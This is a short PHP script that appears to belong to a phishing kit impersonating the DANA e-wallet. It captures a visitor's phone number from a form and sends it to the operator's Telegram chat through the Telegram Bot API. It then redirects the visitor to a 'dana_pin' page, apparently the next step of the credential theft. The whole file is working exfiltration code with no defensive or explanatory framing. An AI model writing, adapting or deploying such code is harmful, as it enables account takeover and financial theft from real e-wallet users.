<?php

session_start();
include "./telegram.php";

$phone_number            = $_POST['phoneNumber'];
$_SESSION['phoneNumber'] = $phone_number;

$message = "
──────────────────────
DANA | AKUN | ".$phone_number."
──────────────────────
• No HP : ".$phone_number."
──────────────────────
-- t.me/ypeeeey --
──────────────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
include 'final.php';
sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../dana_pin/');
?>
